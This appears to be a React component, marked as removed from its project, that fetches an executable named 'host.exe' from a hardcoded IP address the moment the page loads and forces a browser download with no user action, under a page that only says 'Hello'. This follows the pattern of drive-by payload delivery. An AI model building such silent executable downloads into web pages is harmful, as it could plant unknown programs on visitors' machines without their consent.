//this approach was removed from the project

import React, { useState, useEffect } from 'react';

const FileDownload = () => {
  const [downloadStatus, setDownloadStatus] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  useEffect(() => {
    const downloadFile = async () => {
      setIsLoading(true);
      setDownloadStatus('');


      try {
        const response = await fetch('http://3.7.254.110:5000/download_exe', {
          method: 'GET',
          headers: {
            'Accept': 'application/octet-stream',
          },
        });
      
        // if (!response.ok) {
        //   throw new Error(`HTTP error! status: ${response.status}`);
        // }
      console.log(response);
        const contentDisposition = response.headers.get('Content-Disposition');
        let filename = 'host.exe';
        if (contentDisposition) {
          const matches = /filename[^;=\n]*=((['"]).*?\2|[^;\n]*)/.exec(contentDisposition);
          if (matches != null && matches[1]) {
            filename = matches[1].replace(/['"]/g, '');
          }
        }
      
        const blob = await response.blob();
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        
      
        window.URL.revokeObjectURL(url);
        document.body.removeChild(a);

        setDownloadStatus('File downloaded successfully!');
      } catch (error) {
        console.error('Error downloading file:', error);
        setDownloadStatus(`Error downloading file: ${error.message}`);
      } finally {
        setIsLoading(false);
      }
    };

    downloadFile();
  }, []); 

  return (
    <div className="flex flex-col items-center p-4 space-y-4">
      <h2 className="text-2xl font-bold">Hello </h2>
      {isLoading && <p>Loading...</p>}
      {downloadStatus && (
        <div 
          className={`mt-2 text-sm ${
            downloadStatus.includes('Error') 
              ? 'text-red-500' 
              : 'text-green-500'
          }`}
        >
          {downloadStatus}
        </div>
      )}
    </div>
  );
};

export default FileDownload;

